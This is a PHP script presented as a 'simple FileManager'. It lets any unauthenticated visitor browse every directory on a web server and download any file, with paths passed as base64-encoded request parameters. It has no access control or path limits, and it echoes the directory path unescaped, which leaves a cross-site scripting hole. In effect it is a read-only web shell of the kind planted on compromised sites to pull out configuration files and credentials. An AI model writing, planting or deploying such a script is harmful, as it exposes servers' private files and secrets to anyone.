<?php
if(isset($_REQUEST['w'])) {
  dw(base64_decode($_REQUEST['w']));
} else {
  if(isset($_REQUEST['d'])) {
    $dir = base64_decode($_REQUEST['d']);
  } else {
    $dir = dirname(__FILE__);
  }
  $back = rtrim($dir, DIRECTORY_SEPARATOR.basename($dir));
  nr($dir, $back);
}
function nr($dir, $back) {
  echo '<!DOCTYPE html>';
  echo '<html lang="ja">';
  echo '<head>';
  echo '<meta charset="utf-8" />';
  echo '<title>simple FileManager</title>';
  echo '<style>';
  echo '* {font-family: "Lucida Grande","Hiragino Kaku Gothic ProN", "ヒラギノ角ゴ ProN W3", Meiryo, メイリオ, sans-serif;}';
  echo '</style>';
  echo '</head>';
  echo '<body>';
  echo '<h4>simple FileManager</h4>';
  //
  echo "<p>$dir</p>";
  echo '<a href="?d='.base64_encode($back).'">'.$back.'</a>';
  echo '<hr>';
  echo '<table>';
  foreach(glob("$dir/*") as $file) {
    echo '<tr>';
    if(is_dir($file)){
      echo '<td>';
      echo '<a href="?d='.base64_encode($file).'">Dir</a>';
      echo '</td>';
      echo '<td>';
      echo htmlspecialchars(basename($file));
      echo "</td>";
    }
    echo '</tr>';
  }
  foreach(glob("$dir/*") as $file) {
    echo "<tr>";
    if(is_file($file)){
      echo '<td>';
      echo '<a href="?w='.base64_encode($file).'">File</a>';
      echo '</td>';
      echo '<td>';
      echo htmlspecialchars(basename($file));
      echo '</td>';
    }
    echo '</tr>';
  }
  echo '</table>';
  echo '<hr>';
  echo '</body>';
  echo '</html>';
}
function dw($file_path) {
  $file_name = basename($file_path);
  header('Content-Type: application/force-download');
  header('Content-Length: ' . filesize($file_path));
  header('Content-disposition: attachment; filename="' . $file_name . '"');
  readfile($file_path);
}
?>